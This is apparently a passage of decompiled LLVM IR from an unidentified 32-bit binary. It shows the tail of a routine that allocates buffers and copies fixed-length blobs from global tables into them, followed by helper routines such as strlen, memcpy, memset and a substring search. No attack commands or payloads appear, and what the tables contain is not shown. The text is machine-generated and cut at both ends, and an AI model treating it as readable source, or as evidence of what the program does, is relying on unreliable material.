  store i32 %v0_13720, i32* @global_var_1ceb4.589, align 4
  %v1_13724 = trunc i32 %v0_13710 to i8
  store i8 %v1_13724, i8* bitcast (i32* @global_var_1ceb8.590 to i8*), align 4
  %v0_13728 = load i32, i32* %r6.global-to-local, align 4
  %v1_13728 = trunc i32 %v0_13728 to i8
  store i8 %v1_13728, i8* bitcast (i32* @global_var_1ceb9.591 to i8*), align 4
  %v1_1372c = call i32* @malloc(i32 %v0_1371c)
  %v3_1372c = ptrtoint i32* %v1_1372c to i32
  %v0_13734 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v3_1372c, i32* %r5.global-to-local, align 4
  %v3_1373c = call i32 @function_13a18(i32 %v3_1372c, i32 ptrtoint (i32* @global_var_1486c.593 to i32), i32 %v0_13734)
  %v0_13744 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13744, i32* @global_var_1cebc.594, align 4
  %v1_13748 = trunc i32 %v0_13734 to i8
  store i8 %v1_13748, i8* bitcast (i32* @global_var_1cec0.595 to i8*), align 4
  %v0_1374c = load i32, i32* %r6.global-to-local, align 4
  %v1_1374c = trunc i32 %v0_1374c to i8
  store i8 %v1_1374c, i8* bitcast (i32* @global_var_1cec1.596 to i8*), align 4
  %v1_13750 = call i32* @malloc(i32 8)
  %v3_13750 = ptrtoint i32* %v1_13750 to i32
  store i32 %v3_13750, i32* %r5.global-to-local, align 4
  %v4_13760 = call i32 @function_13a18(i32 %v3_13750, i32 ptrtoint ([9 x i8]* @global_var_14880.598 to i32), i32 8)
  store i32 8, i32* %r3.global-to-local, align 4
  %v0_13768 = load i32, i32* %fp.global-to-local, align 4
  store i8 8, i8* bitcast (i32* @global_var_1cec8.599 to i8*), align 4
  %v0_13770 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13770, i32* @global_var_1cec4.600, align 4
  %v0_13774 = load i32, i32* %r6.global-to-local, align 4
  %v1_13774 = trunc i32 %v0_13774 to i8
  store i8 %v1_13774, i8* bitcast (i32* @global_var_1cec9.601 to i8*), align 4
  %v1_13778 = call i32* @malloc(i32 %v0_13768)
  %v3_13778 = ptrtoint i32* %v1_13778 to i32
  %v0_13780 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v3_13778, i32* %r5.global-to-local, align 4
  %v3_13788 = call i32 @function_13a18(i32 %v3_13778, i32 ptrtoint (i32* @global_var_14768.603 to i32), i32 %v0_13780)
  %v0_1378c = load i32, i32* %r7.global-to-local, align 4
  %v0_13790 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13790, i32* @global_var_1cecc.604, align 4
  %v1_13794 = trunc i32 %v0_13780 to i8
  store i8 %v1_13794, i8* bitcast (i32* @global_var_1ced0.605 to i8*), align 4
  %v0_13798 = load i32, i32* %r6.global-to-local, align 4
  %v1_13798 = trunc i32 %v0_13798 to i8
  store i8 %v1_13798, i8* bitcast (i32* @global_var_1ced1.606 to i8*), align 4
  %v1_1379c = call i32* @malloc(i32 %v0_1378c)
  %v3_1379c = ptrtoint i32* %v1_1379c to i32
  %v0_137a0 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v3_1379c, i32* %r5.global-to-local, align 4
  %v3_137ac = call i32 @function_13a18(i32 %v3_1379c, i32 ptrtoint (i32* @global_var_1488c.608 to i32), i32 %v0_137a0)
  %v0_137b4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_137b4, i32* @global_var_1ced4.609, align 4
  %v0_137b8 = load i32, i32* %r7.global-to-local, align 4
  %v1_137b8 = trunc i32 %v0_137b8 to i8
  store i8 %v1_137b8, i8* bitcast (i32* @global_var_1ced8.610 to i8*), align 4
  %v0_137bc = load i32, i32* %r6.global-to-local, align 4
  %v1_137bc = trunc i32 %v0_137bc to i8
  store i8 %v1_137bc, i8* bitcast (i32* @global_var_1ced9.611 to i8*), align 4
  %v1_137c0 = call i32* @malloc(i32 18)
  %v3_137c0 = ptrtoint i32* %v1_137c0 to i32
  store i32 %v3_137c0, i32* %r5.global-to-local, align 4
  %v3_137d0 = call i32 @function_13a18(i32 %v3_137c0, i32 ptrtoint (i32* @global_var_1489c.613 to i32), i32 18)
  store i32 18, i32* %r3.global-to-local, align 4
  store i8 18, i8* bitcast (i32* @global_var_1cee0.614 to i8*), align 4
  %v0_137e0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_137e0, i32* @global_var_1cedc.615, align 4
  %v0_137e4 = load i32, i32* %r6.global-to-local, align 4
  %v1_137e4 = trunc i32 %v0_137e4 to i8
  store i8 %v1_137e4, i8* bitcast (i32* @global_var_1cee1.616 to i8*), align 4
  %v1_137e8 = call i32* @malloc(i32 25)
  %v3_137e8 = ptrtoint i32* %v1_137e8 to i32
  store i32 %v3_137e8, i32* %r5.global-to-local, align 4
  %v3_137f8 = call i32 @function_13a18(i32 %v3_137e8, i32 ptrtoint (i32* @global_var_148b0.618 to i32), i32 25)
  store i32 25, i32* %r3.global-to-local, align 4
  store i8 25, i8* bitcast (i32* @global_var_1cee8.619 to i8*), align 4
  %v0_13808 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13808, i32* @global_var_1cee4.620, align 4
  %v0_1380c = load i32, i32* %r6.global-to-local, align 4
  %v1_1380c = trunc i32 %v0_1380c to i8
  store i8 %v1_1380c, i8* bitcast (i32* @global_var_1cee9.621 to i8*), align 4
  %v1_13810 = call i32* @malloc(i32 111)
  %v3_13810 = ptrtoint i32* %v1_13810 to i32
  store i32 111, i32* %r5.global-to-local, align 4
  store i32 %v3_13810, i32* %r7.global-to-local, align 4
  %v3_13824 = call i32 @function_13a18(i32 %v3_13810, i32 ptrtoint (i32* @global_var_148cc.623 to i32), i32 111)
  %v0_13828 = load i32, i32* %r5.global-to-local, align 4
  %v0_1382c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1382c, i32* @global_var_1ceec.624, align 4
  %v1_13830 = trunc i32 %v0_13828 to i8
  store i8 %v1_13830, i8* bitcast (i32* @global_var_1cef0.625 to i8*), align 4
  %v0_13834 = load i32, i32* %r6.global-to-local, align 4
  %v1_13834 = trunc i32 %v0_13834 to i8
  store i8 %v1_13834, i8* bitcast (i32* @global_var_1cef1.626 to i8*), align 4
  %v1_13838 = call i32* @malloc(i32 %v0_13828)
  %v3_13838 = ptrtoint i32* %v1_13838 to i32
  %v0_1383c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v3_13838, i32* %r7.global-to-local, align 4
  %v3_13848 = call i32 @function_13a18(i32 %v3_13838, i32 ptrtoint (i32* @global_var_1493c.628 to i32), i32 %v0_1383c)
  %v0_13850 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_13850, i32* @global_var_1cef4.629, align 4
  %v0_13854 = load i32, i32* %r5.global-to-local, align 4
  %v1_13854 = trunc i32 %v0_13854 to i8
  store i8 %v1_13854, i8* bitcast (i32* @global_var_1cef8.630 to i8*), align 4
  %v0_13858 = load i32, i32* %r6.global-to-local, align 4
  %v1_13858 = trunc i32 %v0_13858 to i8
  store i8 %v1_13858, i8* bitcast (i32* @global_var_1cef9.631 to i8*), align 4
  %v1_1385c = call i32* @malloc(i32 110)
  %v2_1385c = ptrtoint i32* %v1_1385c to i32
  %v0_13860 = load i32, i32* %r5.global-to-local, align 4
  %v1_13860 = add i32 %v0_13860, -1
  store i32 %v1_13860, i32* %r5.global-to-local, align 4
  store i32 %v2_1385c, i32* %r7.global-to-local, align 4
  %v3_13870 = call i32 @function_13a18(i32 %v2_1385c, i32 ptrtoint (i32* @global_var_149ac.633 to i32), i32 %v1_13860)
  %v0_13874 = load i32, i32* %r5.global-to-local, align 4
  %v0_13878 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_13878, i32* @global_var_1cefc.634, align 4
  %v1_1387c = trunc i32 %v0_13874 to i8
  store i8 %v1_1387c, i8* bitcast (i32* @global_var_1cf00.635 to i8*), align 4
  %v0_13880 = load i32, i32* %r6.global-to-local, align 4
  %v1_13880 = trunc i32 %v0_13880 to i8
  store i8 %v1_13880, i8* bitcast (i32* @global_var_1cf01.636 to i8*), align 4
  %v1_13884 = call i32* @malloc(i32 %v0_13874)
  %v3_13884 = ptrtoint i32* %v1_13884 to i32
  %v0_13888 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v3_13884, i32* %r7.global-to-local, align 4
  %v3_13894 = call i32 @function_13a18(i32 %v3_13884, i32 ptrtoint (i32* @global_var_14a1c.638 to i32), i32 %v0_13888)
  %v0_1389c = load i32, i32* %r5.global-to-local, align 4
  %v1_1389c = trunc i32 %v0_1389c to i8
  store i8 %v1_1389c, i8* bitcast (i32* @global_var_1cf08.639 to i8*), align 4
  %v0_138a0 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_138a0, i32* @global_var_1cf04.640, align 4
  %v0_138a4 = load i32, i32* %r6.global-to-local, align 4
  %v1_138a4 = trunc i32 %v0_138a4 to i8
  store i8 %v1_138a4, i8* bitcast (i32* @global_var_1cf09.641 to i8*), align 4
  %v1_138a8 = call i32* @malloc(i32 117)
  %v3_138a8 = ptrtoint i32* %v1_138a8 to i32
  store i32 %v3_138a8, i32* %r5.global-to-local, align 4
  %v3_138b8 = call i32 @function_13a18(i32 %v3_138a8, i32 ptrtoint (i32* @global_var_14a8c.643 to i32), i32 117)
  store i32 117, i32* %r3.global-to-local, align 4
  %v0_138c0 = load i32, i32* %r6.global-to-local, align 4
  %v1_138c0 = trunc i32 %v0_138c0 to i8
  %v2_138c0 = load i32, i32* %r4.global-to-local, align 4
  %v3_138c0 = add i32 %v2_138c0, 413
  %v4_138c0 = inttoptr i32 %v3_138c0 to i8*
  store i8 %v1_138c0, i8* %v4_138c0, align 1
  %v0_138c4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_138c4, i32* @global_var_1cf0c.644, align 4
  %v0_138c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_138c8 = trunc i32 %v0_138c8 to i8
  store i8 %v1_138c8, i8* bitcast (i32* @global_var_1cf10.645 to i8*), align 4
  %v2_138cc = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_138cc, i32* %r4.global-to-local, align 4
  ret i32 %v3_138b8

; uselistorder directives
  uselistorder i32 %v3_13884, { 1, 0 }
  uselistorder i32 %v2_1385c, { 1, 0 }
  uselistorder i32 %v3_13838, { 1, 0 }
  uselistorder i32 %v3_13810, { 1, 0 }
  uselistorder i32 %v3_1379c, { 1, 0 }
  uselistorder i32 %v3_13778, { 1, 0 }
  uselistorder i32 %v3_1372c, { 1, 0 }
  uselistorder i32 %v3_13708, { 1, 0 }
  uselistorder i32 %v3_136e4, { 1, 0 }
  uselistorder i32 %v3_136c0, { 1, 0 }
  uselistorder i32 %v3_13674, { 1, 0 }
  uselistorder i32 %v2_135ac, { 1, 0 }
  uselistorder i32 %v3_13448, { 1, 0 }
  uselistorder i32 %v3_13424, { 1, 0 }
  uselistorder i32 %v3_133d8, { 1, 0 }
  uselistorder i32 %v3_13364, { 1, 0 }
  uselistorder i32 %v3_1333c, { 1, 0 }
  uselistorder i32 %v3_132c8, { 1, 0 }
  uselistorder i32 %v3_13278, { 1, 0 }
  uselistorder i32 %v2_13228, { 1, 0 }
  uselistorder i32 %v3_131b4, { 1, 0 }
  uselistorder i32 %v2_13164, { 1, 0 }
  uselistorder i32 %v2_13134, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 15, 17, 18, 19, 20, 21, 23, 24, 22, 25, 27, 26, 28, 29, 30, 31, 32, 33, 34, 35 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 98, 99, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 93, 92, 94, 95, 96, 97 }
  uselistorder i32 117, { 2, 1, 0 }
  uselistorder i32 111, { 1, 2, 0 }
  uselistorder i32 18, { 11, 2, 0, 3, 12, 4, 13, 5, 14, 10, 6, 1, 15, 16, 7, 17, 8, 18, 9, 19 }
  uselistorder i32 83, { 2, 1, 0 }
  uselistorder i8 23, { 1, 0 }
  uselistorder i32 23, { 6, 1, 0, 2, 7, 3, 8, 4, 9, 11, 12, 10, 5 }
  uselistorder i32 12, { 7, 8, 20, 21, 66, 67, 68, 22, 19, 23, 24, 25, 26, 27, 28, 30, 31, 29, 69, 70, 71, 6, 72, 73, 75, 76, 77, 3, 79, 74, 5, 34, 32, 33, 4, 11, 12, 13, 14, 15, 16, 78, 35, 9, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 17, 47, 48, 49, 50, 51, 18, 52, 53, 54, 55, 56, 57, 10, 58, 59, 60, 61, 62, 63, 64, 65, 0, 1, 80, 81, 82, 83, 2, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93 }
  uselistorder i32 17, { 10, 3, 0, 27, 11, 12, 4, 13, 5, 14, 6, 15, 7, 16, 8, 9, 17, 18, 1, 19, 20, 21, 2, 22, 23, 24, 25, 26 }
  uselistorder i32 21, { 8, 3, 1, 9, 4, 10, 5, 11, 6, 12, 13, 14, 7, 0, 15, 2, 16 }
  uselistorder i32 22, { 7, 1, 0, 2, 8, 3, 9, 4, 10, 11, 5, 6, 12 }
  uselistorder i8 16, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32 19, { 4, 8, 1, 5, 9, 6, 10, 7, 11, 0, 15, 12, 2, 13, 3, 14 }
  uselistorder i8 3, { 1, 0 }
  uselistorder i8 6, { 5, 6, 4, 7, 8, 0, 9, 10, 1, 2, 3 }
  uselistorder i32 6, { 38, 13, 2, 14, 39, 0, 79, 15, 80, 40, 1, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 3, 27, 28, 29, 30, 31, 4, 32, 41, 42, 43, 5, 44, 45, 46, 47, 6, 48, 49, 50, 51, 7, 52, 8, 53, 54, 55, 33, 56, 9, 57, 58, 59, 34, 60, 10, 61, 62, 63, 35, 64, 65, 66, 67, 68, 36, 69, 11, 70, 71, 72, 73, 74, 75, 37, 76, 12, 77, 78, 81, 82, 83, 84 }
  uselistorder i32 33, { 9, 2, 0, 12, 1, 10, 3, 11, 4, 5, 6, 13, 7, 14, 8, 15, 16 }
  uselistorder i32 13, { 11, 4, 2, 12, 13, 14, 44, 0, 1, 5, 6, 7, 8, 15, 16, 17, 18, 19, 9, 20, 21, 22, 23, 24, 25, 26, 27, 10, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 3, 42, 43 }
  uselistorder i8 4, { 3, 2, 0, 1 }
  uselistorder i32 11, { 2, 9, 1, 37, 38, 39, 40, 41, 0, 10, 3, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 4, 22, 23, 24, 5, 25, 26, 27, 6, 28, 29, 30, 31, 32, 33, 34, 35, 36, 7, 42, 43, 44, 8, 45 }
  uselistorder i8 5, { 11, 12, 0, 1, 10, 2, 3, 4, 5, 6, 7, 8, 13, 9 }
  uselistorder i32 5, { 28, 29, 14, 5, 3, 16, 30, 4, 15, 31, 1, 17, 77, 18, 78, 19, 79, 20, 80, 21, 81, 22, 82, 0, 32, 33, 34, 23, 24, 25, 26, 35, 36, 37, 38, 6, 39, 40, 41, 42, 7, 43, 44, 45, 46, 47, 48, 49, 50, 8, 51, 52, 53, 9, 54, 55, 56, 10, 57, 58, 59, 60, 11, 61, 62, 63, 64, 65, 66, 67, 12, 68, 69, 70, 71, 72, 73, 74, 13, 75, 76, 83, 2, 84, 85, 27, 86 }
  uselistorder i32 7, { 3, 30, 4, 15, 32, 16, 31, 2, 17, 63, 33, 18, 19, 20, 21, 22, 23, 24, 25, 26, 34, 35, 36, 5, 37, 38, 39, 40, 6, 41, 42, 43, 44, 7, 45, 8, 46, 9, 47, 48, 10, 49, 50, 11, 51, 52, 53, 54, 55, 12, 56, 57, 58, 59, 60, 13, 61, 62, 0, 27, 64, 1, 28, 65, 66, 29, 14, 67 }
  uselistorder i32 29, { 7, 1, 0, 8, 9, 5, 2, 3, 4, 6 }
  uselistorder i32 14, { 10, 2, 0, 9, 3, 4, 5, 6, 7, 11, 12, 8, 13, 14, 15, 16, 1, 17 }
  uselistorder i32 (i32, i32, i32)* @function_13a18, { 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 4, 3, 1, 0, 9, 8, 7, 6, 5, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_1cd74.390 to i32), { 5, 0, 1, 2, 3, 4 }
  uselistorder i32* (i32)* @malloc, { 35, 32, 25, 23, 17, 12, 28, 47, 1, 29, 30, 37, 50, 52, 41, 49, 36, 21, 14, 7, 15, 22, 42, 40, 53, 33, 26, 19, 0, 31, 43, 39, 44, 51, 45, 38, 24, 46, 2, 3, 18, 4, 5, 6, 11, 8, 9, 10, 16, 34, 27, 13, 48, 20, 54 }
}

define i32 @function_1399c(i8* %arg1) local_unnamed_addr {
dec_label_pc_1399c:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_139a0 = load i8, i8* %arg1, align 1
  %v4_139a0 = zext i8 %v3_139a0 to i32
  %v2_139a4 = icmp eq i8 %v3_139a0, 0
  br i1 %v2_139a4, label %dec_label_pc_139c0, label %bb

dec_label_pc_139c0:                               ; preds = %dec_label_pc_139b0, %dec_label_pc_1399c
  %merge = phi i32 [ %v4_139a0, %dec_label_pc_1399c ], [ %v1_139b0, %dec_label_pc_139b0 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_1399c
  br label %dec_label_pc_139b0

dec_label_pc_139b0:                               ; preds = %dec_label_pc_139b0, %bb
  %v0_139b0 = phi i32 [ %v1_139b0, %dec_label_pc_139b0 ], [ 0, %bb ]
  %v1_139b0 = add i32 %v0_139b0, 1
  %v2_139b4 = add i32 %v1_139b0, %tmp
  %v3_139b4 = inttoptr i32 %v2_139b4 to i8*
  %v4_139b4 = load i8, i8* %v3_139b4, align 1
  %v2_139b8 = icmp eq i8 %v4_139b4, 0
  br i1 %v2_139b8, label %dec_label_pc_139c0, label %dec_label_pc_139b0

; uselistorder directives
  uselistorder i32 %v1_139b0, { 1, 0, 2 }
}

define i32 @function_139c4(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_139c4:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_139c4 = load i8, i8* %arg1, align 1
  %v3_139c4 = zext i8 %v2_139c4 to i32
  %v2_139c8 = icmp eq i8 %v2_139c4, 0
  br i1 %v2_139c8, label %dec_label_pc_13a0c, label %dec_label_pc_139d0

dec_label_pc_139d0:                               ; preds = %dec_label_pc_139c4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_139d4

dec_label_pc_139d4:                               ; preds = %dec_label_pc_139d4, %dec_label_pc_139d0
  %v0_139d4 = phi i32 [ %v1_139d4, %dec_label_pc_139d4 ], [ 0, %dec_label_pc_139d0 ]
  %v1_139d4 = add i32 %v0_139d4, 1
  store i32 %v1_139d4, i32* %ip.global-to-local, align 4
  %v2_139d8 = add i32 %v1_139d4, %tmp
  %v3_139d8 = inttoptr i32 %v2_139d8 to i8*
  %v4_139d8 = load i8, i8* %v3_139d8, align 1
  %v2_139dc = icmp eq i8 %v4_139d8, 0
  br i1 %v2_139dc, label %dec_label_pc_139e4, label %dec_label_pc_139d4

dec_label_pc_139e4:                               ; preds = %dec_label_pc_139d4
  %v7_139e4 = icmp eq i32 %v0_139d4, -2
  br i1 %v7_139e4, label %dec_label_pc_13a04, label %dec_label_pc_139f0.preheader

dec_label_pc_139f0.preheader:                     ; preds = %dec_label_pc_139e4, %dec_label_pc_13a0c
  %storemerge = phi i32 [ %v3_139c4, %dec_label_pc_13a0c ], [ %v1_139d4, %dec_label_pc_139e4 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_139fc.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_139f0

dec_label_pc_139f0:                               ; preds = %dec_label_pc_139f0.dec_label_pc_139f0_crit_edge, %dec_label_pc_139f0.preheader
  %v2_139fc = phi i32 [ %v5_139fc, %dec_label_pc_139f0.dec_label_pc_139f0_crit_edge ], [ %v2_139fc.pre, %dec_label_pc_139f0.preheader ]
  %v0_139f4 = phi i32 [ %v0_139f4.pre, %dec_label_pc_139f0.dec_label_pc_139f0_crit_edge ], [ %tmp, %dec_label_pc_139f0.preheader ]
  %v0_139f0 = phi i32 [ %v0_139f0.pre, %dec_label_pc_139f0.dec_label_pc_139f0_crit_edge ], [ %storemerge, %dec_label_pc_139f0.preheader ]
  %v1_139f0 = add i32 %v0_139f0, -1
  store i32 %v1_139f0, i32* %r2.global-to-local, align 4
  %v1_139f4 = inttoptr i32 %v0_139f4 to i8*
  %v2_139f4 = load i8, i8* %v1_139f4, align 1
  %v5_139f4 = add i32 %v0_139f4, 1
  store i32 %v5_139f4, i32* %r1.global-to-local, align 4
  %v3_139f8 = icmp eq i32 %v0_139f0, 0
  %v3_139fc = inttoptr i32 %v2_139fc to i8*
  store i8 %v2_139f4, i8* %v3_139fc, align 1
  %v4_139fc = load i32, i32* @r0, align 4
  %v5_139fc = add i32 %v4_139fc, 1
  store i32 %v5_139fc, i32* @r0, align 4
  br i1 %v3_139f8, label %dec_label_pc_13a04.loopexit, label %dec_label_pc_139f0.dec_label_pc_139f0_crit_edge

dec_label_pc_139f0.dec_label_pc_139f0_crit_edge:  ; preds = %dec_label_pc_139f0
  %v0_139f0.pre = load i32, i32* %r2.global-to-local, align 4
  %v0_139f4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_139f0

dec_label_pc_13a04.loopexit:                      ; preds = %dec_label_pc_139f0
  %v0_13a04.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13a04

dec_label_pc_13a04:                               ; preds = %dec_label_pc_13a04.loopexit, %dec_label_pc_139e4
  %v0_13a04 = phi i32 [ %v0_13a04.pre, %dec_label_pc_13a04.loopexit ], [ %v1_139d4, %dec_label_pc_139e4 ]
  ret i32 %v0_13a04

dec_label_pc_13a0c:                               ; preds = %dec_label_pc_139c4
  store i32 %v3_139c4, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_139f0.preheader

; uselistorder directives
  uselistorder i32 %v5_139fc, { 1, 0 }
  uselistorder i32 %v0_139f4, { 1, 0 }
  uselistorder i32 %v1_139d4, { 1, 0, 2, 4, 3 }
  uselistorder i32 %v3_139c4, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder label %dec_label_pc_139f0.preheader, { 1, 0 }
}

define i32 @function_13a18(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13a18:
  %ip.global-to-local = alloca i32, align 4
  %v2_13a18 = icmp eq i32 %arg3, 0
  br i1 %v2_13a18, label %.loopexit, label %bb

.loopexit:                                        ; preds = %dec_label_pc_13a24, %dec_label_pc_13a18
  ret i32 %arg1

bb:                                               ; preds = %dec_label_pc_13a18
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13a24

dec_label_pc_13a24:                               ; preds = %dec_label_pc_13a24, %bb
  %v0_13a24 = phi i32 [ %v1_13a2c, %dec_label_pc_13a24 ], [ 0, %bb ]
  %v2_13a24 = add i32 %v0_13a24, %arg2
  %v3_13a24 = inttoptr i32 %v2_13a24 to i8*
  %v4_13a24 = load i8, i8* %v3_13a24, align 1
  %v4_13a28 = add i32 %v0_13a24, %arg1
  %v5_13a28 = inttoptr i32 %v4_13a28 to i8*
  store i8 %v4_13a24, i8* %v5_13a28, align 1
  %v0_13a2c = load i32, i32* %ip.global-to-local, align 4
  %v1_13a2c = add i32 %v0_13a2c, 1
  store i32 %v1_13a2c, i32* %ip.global-to-local, align 4
  %v9_13a30 = icmp eq i32 %v1_13a2c, %arg3
  br i1 %v9_13a30, label %.loopexit, label %dec_label_pc_13a24

; uselistorder directives
  uselistorder i32 %v1_13a2c, { 1, 2, 0 }
}

define i32 @function_13a3c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13a3c:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %v2_13a3c = icmp eq i32 %arg2, 0
  br i1 %v2_13a3c, label %.loopexit, label %bb

.loopexit:                                        ; preds = %dec_label_pc_13a4c, %dec_label_pc_13a3c
  ret i32 %arg1

bb:                                               ; preds = %dec_label_pc_13a3c
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13a4c

dec_label_pc_13a4c:                               ; preds = %dec_label_pc_13a4c.dec_label_pc_13a4c_crit_edge, %bb
  %v2_13a4c = phi i32 [ %v1_13a50, %dec_label_pc_13a4c.dec_label_pc_13a4c_crit_edge ], [ 0, %bb ]
  %v0_13a4c.off0 = phi i8 [ %extract.t, %dec_label_pc_13a4c.dec_label_pc_13a4c_crit_edge ], [ 0, %bb ]
  %v4_13a4c = add i32 %v2_13a4c, %arg1
  %v5_13a4c = inttoptr i32 %v4_13a4c to i8*
  store i8 %v0_13a4c.off0, i8* %v5_13a4c, align 1
  %v0_13a50 = load i32, i32* %r3.global-to-local, align 4
  %v1_13a50 = add i32 %v0_13a50, 1
  store i32 %v1_13a50, i32* %r3.global-to-local, align 4
  %v9_13a54 = icmp eq i32 %v1_13a50, %arg2
  br i1 %v9_13a54, label %.loopexit, label %dec_label_pc_13a4c.dec_label_pc_13a4c_crit_edge

dec_label_pc_13a4c.dec_label_pc_13a4c_crit_edge:  ; preds = %dec_label_pc_13a4c
  %v0_13a4c.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t = trunc i32 %v0_13a4c.pre to i8
  br label %dec_label_pc_13a4c

; uselistorder directives
  uselistorder i32 %v1_13a50, { 1, 2, 0 }
}

define i32 @function_13a60(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_13a60:
  %v7_13a74 = icmp sgt i32 %arg4, %arg2
  br i1 %v7_13a74, label %dec_label_pc_13a78, label %dec_label_pc_13a80

dec_label_pc_13a78:                               ; preds = %dec_label_pc_13a94, %dec_label_pc_13a60, %dec_label_pc_13a80
  ret i32 -1

dec_label_pc_13a80:                               ; preds = %dec_label_pc_13a60
  %tmp10 = icmp slt i32 %arg2, 1
  br i1 %tmp10, label %dec_label_pc_13a78, label %dec_label_pc_13a88

dec_label_pc_13a88:                               ; preds = %dec_label_pc_13a80
  br label %dec_label_pc_13aa0

dec_label_pc_13a94:                               ; preds = %dec_label_pc_13ab8, %dec_label_pc_13aa0
  %v1_13a94 = add i32 %v0_13ac0, 1
  %v9_13a98 = icmp eq i32 %v1_13a94, %arg2
  br i1 %v9_13a98, label %dec_label_pc_13a78, label %dec_label_pc_13aa0

dec_label_pc_13aa0:                               ; preds = %dec_label_pc_13a94, %dec_label_pc_13a88
  %v0_13ac0 = phi i32 [ %v1_13a94, %dec_label_pc_13a94 ], [ 0, %dec_label_pc_13a88 ]
  %v0_13aac = phi i32 [ %v1_13aac., %dec_label_pc_13a94 ], [ 0, %dec_label_pc_13a88 ]
  %v2_13aa0 = add i32 %v0_13aac, %arg3
  %v3_13aa0 = inttoptr i32 %v2_13aa0 to i8*
  %v4_13aa0 = load i8, i8* %v3_13aa0, align 1
  %v2_13aa4 = add i32 %v0_13ac0, %arg1
  %v3_13aa4 = inttoptr i32 %v2_13aa4 to i8*
  %v4_13aa4 = load i8, i8* %v3_13aa4, align 1
  %v9_13aa8 = icmp eq i8 %v4_13aa4, %v4_13aa0
  %v1_13aac = add i32 %v0_13aac, 1
  %v1_13aac. = select i1 %v9_13aa8, i32 %v1_13aac, i32 0
  br i1 %v9_13aa8, label %dec_label_pc_13ab8, label %dec_label_pc_13a94

dec_label_pc_13ab8:                               ; preds = %dec_label_pc_13aa0
  %v9_13ab8 = icmp eq i32 %v1_13aac., %arg4
  br i1 %v9_13ab8, label %dec_label_pc_13ac0, label %dec_label_pc_13a94

dec_label_pc_13ac0:                               ; preds = %dec_label_pc_13ab8
  %v1_13ac0 = add i32 %v0_13ac0, 1
  ret i32 %v1_13ac0

; uselistorder directives
  uselistorder i1 %v9_13aa8, { 1, 0 }
  uselistorder i32 %v0_13aac, { 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_13a78, { 0, 2, 1 }
}

define i32 @function_13ac8(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13ac8:
  %tmp = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_13ad4

dec_label_pc_13ad4:                               ; preds = %.thread, %dec_label_pc_13aec, %bb, %dec_label_pc_13ac8
